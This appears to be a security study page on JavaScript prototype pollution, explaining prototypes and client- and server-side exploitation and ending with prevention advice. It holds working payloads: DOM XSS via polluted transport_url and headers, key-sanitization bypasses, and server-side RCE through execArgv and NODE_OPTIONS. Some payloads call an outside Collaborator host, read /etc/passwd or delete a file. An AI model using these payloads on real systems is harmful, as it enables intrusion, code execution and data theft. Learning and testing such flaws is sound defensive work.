# Prototype Pollution

## What is prototype pollution?

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## Javascript prototypes and inheritance

{% code overflow="wrap" fullWidth="true" %}
```javascript
########### What is an object in JavaScript?
Just a collection of key:value pairs known as "properties". Example:
const user =  {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
# You can access the properties of an object by using dot notation or bracket notation to refer to their respective keys: 
user.username     // "wiener"
user['userId']    // 01234
# As well as data, properties may also contain executable functions (methods)
const user =  {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // do something
    }
}
# The example above is an "object literal", which means it was created using curly brace syntax to explicitly declare
# its properties and their initial values. However, almost everything in JavaScript is an object under the hood. 
# "Object" refers to all entities, not just object literals.

############# What is a prototype in JavaScript?
Every object in JavaScript is linked to another object of some kind, known as its prototype.
By default, JavaScript automatically assigns new objects one of its built-in prototypes. 
For example, strings are automatically assigned the built-in String.prototype
# Global prototype examples
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype
let myString = "";
Object.getPrototypeOf(myString);    // String.prototype
let myArray = [];
Object.getPrototypeOf(myArray);	    // Array.prototype
let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
# Objects automatically inherit all of the properties of their assigned prototype, 
# unless they already have their own property with the same key.
# Built-in protoypes have useful properties and methods -> String.prototype object has a toLowerCase() method
```
{% endcode %}

## How does object inheritance work in JavaScript?

Whenever you reference a property of an object, the JavaScript engine first tries to access this directly on the object itself

If the object does not have a matching property, it looks for it on the object prototype.

Given the following objects, this enables you to reference `myObject.propertyA`, for example:

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

You can use your browser console to see this behavior in action. First, create a completely empty object:

`let myObject = {};`

Next, type `myObject` followed by a dot. Notice that the console prompts you to select from a list of properties and methods:

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Even though there are no properties or methods defined for the object itself, it has inherited some from the built-in `Object.prototype`.

## The prototype chain

Note that an object's prototype is just another object, which should also have its own prototype, and so on. As virtually everything in JavaScript is an object under the hood, this chain ultimately leads back to the top-level `Object.prototype`, whose prototype is simply `null`.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Objects inherit properties not just from their immediate prototype, but from all objects above them in the prototype chain.

In the example above, this means that the `username` object has access to the properties and methods of both `String.prototype` and `Object.prototype`.

## Accessing an object's prototype using \_\_proto\_\_

```javascript
__proto__ is the de facto standard
username.__proto__
username['__proto__']
#  You can even chain references to __proto__ to work your way up the prototype chain: 
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```

## Modifying prototypes

Although it's generally considered bad practice, it is possible to modify JavaScript's built-in prototypes just like any other object.

{% code overflow="wrap" fullWidth="true" %}
```javascript
# For example, modern JavaScript provides the trim() method for strings (remove whitespaces). Before that, people did:
String.prototype.removeWhitespace = function(){
    // remove leading and trailing whitespace
}
# Thanks to the prototypal inheritance, all strings would then have access to this method:
let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```
{% endcode %}

## How do prototype pollution vulnerabilities arise?

When a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like `__proto__`, along with arbitrary nested propert

It's possible to pollute any prototype object, but this most commonly occurs with the built-in global `Object.prototype`.

Prototype pollution requires the following key components:

• A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.

• A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.

• An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

## Prototype pollution sources

A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows:

• The URL via either the query or fragment string (hash)

• JSON-based input

• Web messages

{% code overflow="wrap" fullWidth="true" %}
```sh
############ Prototype pollution via the URL
https://vulnerable-website.com/?__proto__[evilProperty]=payload
# You might think that __proto__ property, along with its nested evilProperty, will just be added to the target object:
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
#  However, this isn't the case. At some point, the recursive merge operation may assign the value of evilProperty using a statement equivalent to the following:
targetObject.__proto__.evilProperty = 'payload';
# evilProperty is assigned to the returned prototype object rather than the target object itself.
# If default is Object.prototype, all objects in the JavaScript runtime will now inherit evilProperty,
# unless they already have a property of their own with a matching key. 
In practice, injecting a property called evilProperty is unlikely to have any effect. 
However, an attacker can use the same technique to pollute the prototype with properties that are used by the app, or any imported libraries. 

############ Prototype pollution via JSON input
#  Let's say an attacker injects the following malicious JSON, for example, via a web message:
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
# If converted into a JavaScript object via JSON.parse() -> resulting object will have a property with the key __proto__:
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```
{% endcode %}

## Prototype pollution sinks

A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands.

## Prototype pollution gadgets

A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:

* Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
* Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.

A property cannot be a gadget if it is defined directly on the object itself. Robust websites may also explicitly set the prototype of the object to _null_, which ensures that it doesn't inherit any properties at all.

{% code overflow="wrap" fullWidth="true" %}
```sh
############ Example of a prototype pollution gadget
let transport_url = config.transport_url || defaults.transport_url;
# Now imagine the library code uses this transport_url to add a script reference to the page:
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
# If devs did not set transport_url property on their config object, this is a potential gadget.
# Attacker could be able to pollute global Object.prototype with their own transport_url property and would be inherited
# for the object and, therefore, set as the src for this script to a domain of the attacker's choosing. 

# If prototype can be polluted via a query parameter, attacker would induce victim to visit a crafted URL:
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
#  By providing a data: URL, an attacker could also directly embed an XSS payload within the query string as follows: 
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
#  Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix. 
```
{% endcode %}

## Client-side Prototype pollution

{% code overflow="wrap" fullWidth="true" %}
```sh
############### Finding client-side prototype pollution sources manually
Trial and error. Try different ways of adding an arbitrary property to Object.prototype until you find a source that work
# 1. Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. For example:
vulnerable-website.com/?__proto__[foo]=bar
# 2. In your browser console, inspect Object.prototype to see if you have successfully polluted it
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
# 3. If property was not added, try different techniques, such as dot notation or bracket (first example) notation:
vulnerable-website.com/?__proto__.foo=bar
# 4. Repeat this process for each potential source.
# TIP: If neither of these techniques is successful, you may still be able to pollute the prototype via its constructor.

############## Finding client-side prototype pollution sources using DOM Invader
DOM Invader comes preinstalled with Burp built-in browser. It autom. test prototype pollution sources as you browse.

############## Finding client-side prototype pollution gadgets manually
Identify source to add properties to the global Object.prototype -> (then) Find gadget to craft an exploit
# 1. Read source code and identify any properties that are used by the application or any libraries that it imports.
# 2. Proxy > Options > Intercept server responses and intercept the response containing the JavaScript you wanna test.
# 3. Add a debugger statement at the start of the script, then forward any remaining requests and responses.
# 4. In Burp's browser, go to the page where target script is loaded. The debugger statement pauses script execution.
# 5. While the script is still paused, switch to the console and enter the following command, 
# replacing YOUR-PROPERTY with one of the properties that you think is a potential gadget:
    Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
        get() {
            console.trace();
            return 'polluted';
        }
    })
Property is added to the global Object.prototype, and browser will log a stack trace to the console whenever it is accessed.
# 6. Press the button to continue execution of the script and monitor the console. If a stack trace appears, 
# this confirms that the property was accessed somewhere within the application.
# 7. Expand the stack trace and use the provided link to jump to the line of code where the property is being read.
# 8. Using the browser's debugger controls, step through each phase of execution to see 
# if the property is passed to a sink, such as innerHTML or eval().
# 9. Repeat this process for any properties that you think are potential gadgets.

################# Finding client-side prototype pollution gadgets using DOM Invader
 DOM Invader can automatically scan for gadgets on your behalf and can even generate a DOM XSS PoC in some cases.
Burp > Proxy > Intercept > Open browser > DOM extension > DOM Invader on > Prototype pollution on > Scan for gadgets

# EXAMPLE: DOM XSS VIA CLIENT-SIDE PROTOTYPE POLLUTION
- Try https://web.net/?__proto__[foo]=bar
- Console > Object.prototype.foo / we see value "bar" is there
- Debugger > read .js files to find
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
- Notice that no transport_url property is defined for the config object.
- Use the prototype pollution source /?__proto__[transport_url]=foo
- DevTools > Elements > read HTML > observe <script> element has been rendered on the page, with the src attribute foo
- We can embed XSS payload to that object property   
?__proto__[transport_url]=data:,alert();//

# EXAMPLE: DOM XSS via an alternative prototype pollution vector
vulnerable-website.com/?__proto__.foo=bar
# Check Debugger > .js files
let a = manager.sequence || 1;
    manager.sequence = a + 1;
    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
# Try this
?__proto__.sequence=alert()
# On Console we have an error, click on it, set a breakpoint and refresh the web
# We see number 1 appended like this data:,alert();//1 so we use this payload
alert()- # in reality is alert()-1 which makes NaN and then the second part (1) of the || is true but alert() is executed

################ Prototype pollution via the constructor
Unless its prototype is set to null, every JavaScript object has a constructor property.
# For example, you can create a new object either using literal syntax or by invoking the Object() constructor:
let myObjectLiteral = {};
let myObject = new Object();
# You can then reference the Object() constructor via the built-in constructor property:
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
# Each constructor function has a prototype property. As a result, you can also access any object's prototype as follows:
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
# As myObject.constructor.prototype is equivalent to myObject.__proto__, this provides an alternative vector for prototype pollution. 

############### Bypassing flawed key sanitization
# Websites prevent prototype pollution by sanitizing property keys, but sometimes they fail sanitizing recursively:
vulnerable-website.com/?__pro__proto__to__.gadget=payload
# If the sanitization process just strips the string __proto__ without repeating this process more than once
vulnerable-website.com/?__proto__.gadget=payload

############### Prototype pollution in external libraries
DOM Invader is recommended in this case. It is much quicker to detect some tricky vulnerabilities.
# EXAMPLE: Deliver exploit to a victim
/#__proto__[hitCallback]=alert%28document.cookie%29
<script>
location="https://xxxx"
</script>
```
{% endcode %}

## Prototype pollution via browser APIs

There are a number of widespread prototype pollution gadgets in the JavaScript APIs commonly provided in browsers.

{% code overflow="wrap" fullWidth="true" %}
```sh
############## Prototype pollution via fetch()
Fetch API provides a simple way to trigger HTTP requests using JavaScript. The fetch() method accepts two arguments:
    The URL to which you want to send the request.
    An options object that lets you to control parts of the request, such as the method, headers, body parameters, and so on.
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
})
# We left some options undefined. If an attacker can find a suitable source -> pollute Object.prototype w/ own headers
# For example, the following code is potentially vulnerable to DOM XSS via prototype pollution: 
fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
# An attacker could pollute Object.prototype with a headers property containing a malicious x-username header:
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>

##################### Prototype pollution via Object.defineProperty()
# Devs attempt to block potential gadgets by using the Object.defineProperty() method -> non-configurable, non-writable property directly on the affected object 
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
# Object.defineProperty() accepts an options object, known as a "descriptor". Devs might have not set a value at all. 
# An attacker may be able to bypass this defense by polluting Object.prototype with a malicious value property. 
/?__proto__[value]=data,alert();//

# EXAMPLE
- Try to find a source -> /?__proto__[foo]=bar
- Look at Debugger > .js files
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
- /?__proto__[value]=foo and confirm on Elements that script src has value of foo
- /?__proto__[value]=data,;alert()//
```
{% endcode %}

## Server-side prototype pollution

{% code overflow="wrap" fullWidth="true" %}
```sh
##################### Why is server-side prototype pollution more difficult to detect?
- No source code access 
- Lack of developer tools
- The DoS problem
- Pollution persistence


##################### Detecting server-side prototype pollution via polluted property reflection
JavaScript for...in loop iterates over all of an object enumerable properties, including inherited via prototype
Note: this does not include built-in properties set by JavaScript native constructors (non-enumerable by default)
#  You can test this out for yourself as follows: 
const myObject = { a: 1, b: 2 };

// pollute the prototype with an arbitrary property
Object.prototype.foo = 'bar';

// confirm myObject does not have its own foo property
myObject.hasOwnProperty('foo'); // false

// list names of properties of myObject
for(const propertyKey in myObject){
    console.log(propertyKey);
}

// Output: a, b, foo
# This also applies to arrays, where a for...in loop first iterates over each index
const myArray = ['a','b'];
Object.prototype.foo = 'bar';

for(const arrayKey in myArray){
    console.log(arrayKey);
}

// Output: 0, 1, foo
# If the app later includes the returned properties in a response -> probe server-side prototype pollution. 

# POST or PUT requests that submit JSON data to an application or API are prime candidates to be polluted:
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
# If the website is vulnerable, your injected property would then appear in the updated object in the response:
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
Once you identify that server-side prototype pollution is possible -> look for potential gadgets to use for an exploit.
# EXAMPLE:
Identify POST/PUT JSON data and a property on the response that is not set by the request, use protot. pol. isAdmin:true


##################### Detecting server-side prototype pollution without polluted property reflection
Most of the time -> when you pollute a server-side prototype object -> you will not see property reflected on response
Approach -> inject properties that match potential configuration options for the server (sth we can compare after/before)
    Status code override
    JSON spaces override
    Charset override
All of these injections are non-destructive, but still produce a consistent and distinctive change in server behavior.

############ Status code override
Server-side JavaScript frameworks allow devs to set custom HTTP response statuses including error object in JSON format.
# Example 
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
# Node's http-errors module contains the following function for generating this kind of error response:
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
# If devs haven't explicitly set a status property for the error -> prototype pollution as follows: 
1. Find a way to trigger an error response (e.g., break JSON request) and take note of the default status code.
2. Try polluting the prototype with your own status property. Use an obscure status code not used by the server.
"__proto__":{

"status":499}
4. Trigger the error response again (break JSON) and check whether you have successfully overridden the status code.
# NOTE: As code above states, you must choose a status code in the 400-599 range.


########### JSON spaces override
Express provides a json spaces option -> we can configure number of spaces used to indent any JSON data in the response.
In many cases, devs leave this property  undefined, making it  susceptible to pollution via the prototype chain.
If JSON response -> pollute w/ json spaces property -> see if indentation increases (or remove identation to confirm vuln)
Although the prototype pollution has been fixed in Express 4.17.4, websites that have not upgraded may still be vulnerable. 
# NOTE: When attempting this technique in Burp -> switch to the message editor's Raw tab (to see indentation change)
# EXAMPLE:
"__proto__":  {

"json spaces":    10

}
# If unaffected, try with the constructor form
"constructor":{

"prototype":{

"json spaces":10

}

}
# Identify gadget and pollute it with the prototype
"constructor":{

"prototype":{

"isAdmin":true

}

}

########### Charset override
Express servers often implement "middleware" modules that enable preprocessing of requests
body-parser module is commonly used to parse the body of incoming requests in order to generate a req.body object
following code passes an options object into the read() function, which is used to read in the request body for parsing
One of these options, encoding, determines which character encoding to use. This is either derived from 
the request itself via the getCharset(req) function call, or it defaults to UTF-8. 
var charset = getCharset(req) or 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
# getCharset() -> Content-Type header w/o explicit charset attribute -> reverts to an empty string (controllable for p.p.)
# If you can find an object whose properties are visible in a response, you can use this to probe for sources.
1. Add arbitrary UTF-7 encoded string to a property reflected in a response. For example, foo in UTF-7 is +AGYAbwBv-. 
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
2. Send the request. Servers will not use UTF-7 encoding by default -> string should appear encoded in the response
3. Try to pollute the prototype with a content-type property that explicitly specifies the UTF-7 character set: 
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
4. Repeat the first request. If you successfully polluted the prototype, the UTF-7 string should now be decoded:
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
# Due to a bug in Node's _http_incoming module, this works even when the request's actual Content-Type header 
# includes its own charset attribute.
# To avoid overwriting properties when a request contains duplicate headers, the _addHeaderLine() function 
# checks that no property already exists with the same key before transferring properties to an IncomingMessage object
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
# If it does, the header being processed is effectively dropped
# if we pollute the prototype with our own content-type property, property of real Content-Type header is dropped


################### Scanning for server-side prototype pollution sources
Server-Side Prototype Pollution Scanner extension for Burp Suite
    Install the Server-Side Prototype Pollution Scanner extension from the BApp Store and enable it
    Explore the target website using Burp browser to map as much of the content as possible and accumulate traffic in the proxy history.
    In Burp, go to the Proxy > HTTP history tab.
    Filter the list to show only in-scope items.
    Select all items in the list.
    Right-click your selection and go to Extensions > Server-Side Prototype Pollution Scanner > Server-Side Prototype Pollution, then select one of the scanning techniques from the list.
    When prompted, modify the attack configuration if required, then click OK to launch the scan.
In Burp Pro, the extension reports any prototype pollution via the Issue activity panel on the Dashboard and Target tabs.
In Burp Community, Extensions > Installed tab, select the extension, then monitor its Output tab for any reported issues. 
# NOTE: If you're unsure which scanning technique to use, you can also select Full scan (all techniques).


################### Bypassing input filters for server-side prototype pollution
- Obfuscate the prohibited keywords so they are missed during the sanitization.
- Access the prototype via the constructor property instead of __proto__. -> sth like constructor{prototype{foo:bar}}
# Node applications can also delete or disable __proto__ altogether using the command-line flags --disable-proto=delete
# or --disable-proto=throw respectively. However, this can also be bypassed by using the constructor technique. 


##################### Remote code execution via server-side prototype pollution
####### Identifying a vulnerable request
There are a number of potential command execution sinks in Node -> in the child_process module -> payload -> Collaborator
NODE_OPTIONS env variable -> define command-line arguments & is a property of env object (we can control it if undefined)
# If Node function to create shell processes accept shell property + malicious NODE_OPTIONS property, you can pollute:
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
# TIP: escaped double-quotes in the hostname aren't strictly necessary. However, obfuscates hostname to bypass WAFs

####### Remote code execution via child_process.fork()
# Methods such as child_process.spawn() and child_process.fork() enable developers to create new Node subprocesses. 
# fork() accepts an options object, one is execArgv property w/ --eval argument (run Javascript such as module load):
"__proto__": {
"execArgv": [
    "--eval=require('<module>')"
]
}
require('child_process').execSync('whoami')
# In addition to fork(), the child_process module contains the execSync() -> runs string as system command
# EXAMPLE:
- Analyze suspicious requests, try different sources such as json spaces
"constructor":{

"prototype":{

"json spaces":10

}

}
- Then confirm RCE on that same request and observe it on Burp Collaborator
"__proto__": {
    "shell":"node",
    "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
}
- Finally, craft an exploit to run a system command
"__proto__":{
"execArgv": [

 "--eval=require('child_process').execSync('cat /etc/passwd')"

]

}
- We could need admin privileges or any other process to really run the prototype pollution.

######## Remote code execution via child_process.execSync()
Just like fork(), the execSync() method also accepts options object, which may be pollutable via the prototype chain.
You can still inject system commands into a running child process by polluting both shell and input properties:
- input -> just a string passed to stdin stream and executed as a system command by execSync()
- shell -> declare a specific shell in which they want the command to run -> leave undefined
# By polluting both, we can replace the original command run with our malicious command. However, there are caveats:
- shell option only accepts the name of the shell executable, not any additional command-line arguments. 
- shell is always executed with the -c argument, but in Node is syntax check -> tricky to use Node shell to run commands
- input property containing your payload is passed via stdin -> shell you choose must accept commands from stdin. 
# Text editors (Vim and ex) fulfill all of these criteria. If either of these happen to be installed -> RCE doing this:
"shell":"vim",
"input":":! <command>\n"
# NOTE: Vim has interactive prompt and expects the user to hit Enter; that is why \n 
Additional limitation -> some tools do not read from stdin
Solution: e.g., curl read stdin and send the contents as the body of a POST request using the -d @- argument
In other cases, you can use xargs, which converts stdin to a list of arguments that can be passed to a command. 




    The application run Node.js and the Express framework. It is vulnerable to server-side prototype pollution (SSPP) because it unsafely merges user-controllable input into a server-side JavaScript object.

    SSPP Exploit steps:

    Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
    Identify a gadget that you can use to inject and execute arbitrary system commands.
    Trigger remote execution of a command that deletes the file /home/carlos/morale.txt.

    Identify prototype pollution

"__proto__": {
    "json spaces":10
}

    Test for remote code execution (RCE) by performing DNS request from back-end.

"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://OASTIFY.COM')"
    ]
}

Inject exploit in to read or delete user sensitive data. After injection, trigger new spawned node child processes, by using admin panel maintenance jobs button. This will action on Carlos secret file.

"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```
{% endcode %}

## Preventing prototype pollution vulnerabilities

{% code overflow="wrap" fullWidth="true" %}
```sh
- Sanitizing property keys. Avoid keys such as __proto__ by implementing an allowlist.

- Preventing changes to prototype objects.
Object.freeze(Object.prototype); # ensures properties and values can no longer be modified, so no potential sources
Object.seal() # similar, but still allows changes to the values of existing properties (use it if cannot Object.freeze)

- Preventing an object from inheriting properties.
# Create the object with a null prototype, which ensures that it won't inherit any properties at all. 
let myObject = Object.create(null);
Object.getPrototypeOf(myObject);    // null

- Using safer alternatives where possible.
# Map to define an object options -> it does not return properties that are not defined on the Map
Object.prototype.evil = 'polluted';
let options = new Map();
options.set('transport_url', 'https://normal-website.com');

options.evil;                    // 'polluted'
options.get('evil');             // undefined
options.get('transport_url');    // 'https://normal-website.com'
# Set is another alternative if you're just storing values rather than key:value pairs. 
# Just like maps, sets provide built-in methods that only return properties that were defined directly on the object itself: 
Object.prototype.evil = 'polluted';
let options = new Set();
options.add('safe');

options.evil;           // 'polluted';
option.has('evil');     // false
options.has('safe');    // true
```
{% endcode %}
